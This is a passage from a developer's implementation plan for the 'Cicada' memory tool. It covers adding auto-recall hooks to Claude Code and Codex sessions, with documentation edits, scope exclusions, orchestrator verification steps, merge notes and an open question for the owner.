     > - **When it is skipped.** `CICADA_CAPTURE=off` spawns, `CICADA_RECALL=off`, and a Codex sub-agent's prompt.
     >   Codex also runs a new hook only after the person trusts it at startup.
     > - **The ledger.** One `hook_recall` ledger row per firing, ids and enums only, filed beside `read`.
     > - **Remote.** Remote connectors have no hooks.
  4. The Telemetry paragraph (`:488-493`) gains: "The `hook_recall` kind (G149) is one row per recall-hook firing:
     harness, event, reason enum, the page ids and their count, token and latency buckets, and the model id when the
     harness sends one. It is filed beside `read` for the same reason, and like `capture` it is a per-turn receipt
     that `consumption_stats._activity` keeps out of every Usage view. The prompt never is."
  5. The **Agent wiring** paragraph (`:754-760`): after "*auto-save* (…)" add ", *auto-recall* (G149: `autorecall`
     = `on|off|stale|invalid|n/a` for the recall hooks, with `autorecallOn` / `autorecallOff` argv kept apart from
     `connect`, which onboarding runs; Settings → Agents → *Remembers automatically* runs them)". After "behind an
     allowlist pinned to its own checkout" add "(which also accepts the recall hook's two events and
     `registry.py uninstall --hook recall`)".
- [ ] **Step 2: `docs/goals/memory-evolution.md`, row G76 only.**
  - Replace "SessionStart `additionalContext` shape (the portability doc's checklist still flags it)" with "~~SessionStart
    `additionalContext` shape~~ (verified 2026-09-24 for both harnesses, G149)".
  - Append to "Codex hooks hands-on (trust flow, …)": " (source-verified 2026-09-24: a new or changed user hook runs
    only once trusted; Codex's startup review offers Review / Trust all / Continue without trusting)".
  - After "the `install.md` paste-prompt half stays open." add: " **(b)(iv) SessionStart primer shipped by G149
    (2026-09-24):** `api/hooks/recall.py` sends the handshake as `additionalContext` under a "From Cicada" header in
    Claude Code and Codex. `HOOK_POINTER` stays for AGENTS.md."
- [ ] **Step 3: `docs/goals/TODO.md`.** Add a first row to the **🔄 In progress** table:
  `| **G149 implicit recall (round 4)** | Built on `feat/r4-implicit-recall` (plan `2026-09-24-r4-implicit-recall.md`): the recall hook (SessionStart primer + UserPromptSubmit note), `POST /capture/hook-context`, contract item 8, Settings → Agents → Remembers automatically. | Orchestrator install + live check (the plan's Verification), then merge; the owner decides whether onboarding / the C5 prompt turn it on by default. |`
- [ ] **Step 4: Commit** — `docs: implicit recall (G149) — CLAUDE.md rails, G76(b)(iv) shipped, TODO`.

---

## Not in scope

Named here so a reviewer does not read an absence as an oversight.

- **The benchmark harness (G148)**, and measuring hooks vs tools per model. This track ships the mechanism G148
  measures.
- **Remote connectors (G135).** A cloud app has no hook, and the remote contract is untouched (R-H13).
- **Writes via hooks.** Capture stays the Stop hook, and no hook writes a claim, an episode or an inbox answer.
- **Semantic-only injection** (a page the message does not name). This needs a cosine floor tuned against G148's H
  mode first (R-H4).
- **A cwd → project rule.** `cwd` is accepted and unused (R-H17).
- **Other harnesses' hooks** (Gemini CLI, Cursor, Claude desktop). None has a verified hook surface in this repo.
- **Turning recall on from onboarding's Turn on or C5's paste prompt.** `connect` is unchanged. This is the open
  question.
- **Reading Codex's trust state** (its config) to show "trusted?" in the app. Cicada never touches Codex's trust
  (R-H14).
- **Per-page `read` telemetry** for injected pages (R-H9), and any app surface for the `hook_recall` ledger.
- **User-tunable floor, budget or stopwords**, and stopword languages beyond English and Spanish.
- **The G148/G149 backlog rows.** The orchestrator updates G149 at landing.

---

## Verification the orchestrator runs at the end

Steps 5–10 touch the owner's live install (`~/.claude/settings.json`, `~/.cicada`, the real bank). They are the
orchestrator's, with the owner present, and never an implementer's (Global Constraints). Nothing in them prints
bank content: the recall log holds enums, counts and milliseconds, and step 7 prints a number.

1. `cd <worktree> && api/.venv/bin/python -m pytest api/tests -q -p no:cacheprovider` → **0 failures** (≥ 3775
   passed plus the new tests). If `test_agent_provenance.py::test_a_decay_only_change_lands_in_its_own_cicada_authored_commit`
   is the only red, re-run it alone and report both results.
2. `cd <worktree>/app/CicadaApp && swift build 2>&1 | tail -5` → success, and `swift test 2>&1 | tail -20` → **0
   failures** (≥ 2003 plus the new tests). `node --test app/CicadaApp/Tests/graph/*.test.js` → 8/8.
3. **The numbers for the PR body:**
   `api/.venv/bin/python -m pytest api/tests/test_hook_recall_latency.py -q -s -p no:cacheprovider`. Report:
   - the service p50/p95 and the route p50/p95 at 2,000 entities with FTS warm;
   - the primer p50/p95;
   - the note-token distribution (min/p50/p95/max).
   Budgets: service p95 ≤ 100 ms, route p95 ≤ 150 ms, and every note ≤ 400 tokens.
4. **The privacy gate bites.** Temporarily make the route's warning `logger.exception(f"… {exc}")` and run
   `test_hook_recall_privacy.py`. It must go red. Revert and confirm green. A gate that has never failed is not known
   to work.
5. **Install** (the orchestrator's own step):
   - `./install.sh --dry-run` shows section 5c's two registrations per harness.
   - A real `./install.sh` registers them. `make doctor` passes check 13.
   - `~/.claude/settings.json` keeps the Stop hook and every other hook it held.
6. **Live, Claude Code**, in a scratch directory:
   - Start a session. `~/.cicada/logs/recall.log` shows `session_start http 200 primer`.
   - Ask "what does Cicada tell you at the start of a session?" The answer draws on the primer, and the model does
     not flag it as an injection.
   - Send `zzqx hello` → `no_match` with its latency. The script's round trip (`time` on the logged ms) is well under
     1 s.
   - The **owner** then sends a prompt naming one of his projects and confirms the "From Cicada" note is right.
     Nobody else reads the owner's bank.
7. **Capture safety, live.** After that session's Stop hook fires, the owner (or the orchestrator with the owner's
   go-ahead) counts the note header in its episode. A count only, never the content:
   `grep -c "From Cicada (the person's memory" <bank>/episodes/<that episode>.md` → **0**.
8. **Codex.** Open Codex → the startup review lists Cicada's hooks → Trust all → `recall.log` shows `codex` lines.
   Also confirm the SessionStart primer arrives whole: the handshake's budget is 1,800 tokens by the chars/4 proxy,
   and Codex spills hook output past 2,500 real tokens (`output_spill.rs`), so a primer the tokenizer counts higher
   than its proxy would arrive cut. If it does, lower the primer the hook sends, not the handshake's own budget.
9. **App** (installed build, demo bank for anything that shows memory), in both themes at 1.0× and 1.4×:
   - Settings → Agents shows **Remembers automatically**, with the Claude Code and Codex marks and the Codex trust
     sentence.
   - **Turn off** removes exactly the two recall entries (the Stop hook stays), **Turn on** restores them, and a
     moved-repo stale state offers **Update**.
   - ⌘K "remember" lands on the row.
10. `curl -s -H "Authorization: Bearer $(cat ~/.cicada/api_token)" localhost:8000/agents/wiring | python3 -m json.tool`:
    each installed harness has `autorecall`, `autorecallOn` and `autorecallOff`, and its `connect` equals the
    pre-merge one byte for byte.
11. **The PR body states:**
    - no ETag, Store domain or `VersionVector` mapping was added;
    - `connect`, `PROBE_TIMEOUT_S` and the C5 inputs are unchanged;
    - `CONTRACT_VERSION` 6 → 7;
    - the prompt is never logged (the privacy test, point 4);
    - no price, token count or `/consumption/*` read appears on any app surface this PR touches.

### Merge notes (for the orchestrator)

- **`api/tests/test_demo_capture_routes.py`.** The calendar track (C6) adds a `GATED` route while this track adds a
  `HANDLED_ELSEWHERE` line. It is a textual conflict only, so keep both.
- **`api/services/agent_wiring.py`.** This track adds functions and a two-line merge in `probe()`. The C5 track
  adds `/agents/setup` from the same argv and raises `PROBE_TIMEOUT_S`. Keep both sides. C5's prompt, built from
  `connect`, does not turn recall on (R-H11) until the owner answers the open question.
- **`handshake.CONTRACT_VERSION`.** If another track also landed a 7, take 8 and keep both history comments (R-H13).
- **`ConnectView.swift`.** This track's only edit there is the one `AutoRecallGroup()` line. If C5's rewrite moved
  the groups, re-insert it after the "Agents on this Mac" group.
- **`feat/r4-foundations-back` (D1/C1/D6) touches four files this track also edits.** Checked against that branch
  on 2026-09-24; every overlap is textual and each side keeps its lines:
  - `api/routers/capture.py`: both change `from pydantic import BaseModel` to `BaseModel, Field`. Keep one import.
    That track adds `effort` to `TranscriptCaptureRequest`; this one appends `HookContextRequest` and the route.
  - `api/services/transcript_extract.py`: that track adds `from api.services.agent_turns import …` beside
    `episode_scrub`'s import, `Turn.model/effort`, and model/effort plumbing through `_Builder` and both extractors.
    This track adds the `recall_text` import, two tag names, `_HOOK_OUTPUT_RE`, and the two filter lines. Keep both
    imports. `:297`/`:299`/`:373` are unchanged by that track.
  - `api/models/schemas.py`: different classes (`TimelineItem`, the claim models vs `AgentWiringStep/Row`).
  - `api/hooks/capture.py` is theirs only; `api/hooks/recall.py` is new here.
- **`dev` moved past this base.** `ed6055f` (PR #101) added the G148/G149 rows and the research doc. Task 5 edits
  only the G76 row, so the merge is clean. Update G149's status there at landing.

## Open questions (owner only)

1. **Should first-run setup turn "Remembers automatically" on by default?** That covers onboarding's Turn on for
   Claude Code and Codex, and C5's copy-paste setup prompt. `install.sh` now registers the recall hooks by default
   (`CICADA_RECALL=off` skips them), but the app's own setup paths leave recall off until the person turns it on in
   Settings → Agents. Recall off means their agents see memory only when they ask for it. Folding it in means every
   new session starts with the primer and a short note on names the person mentions.
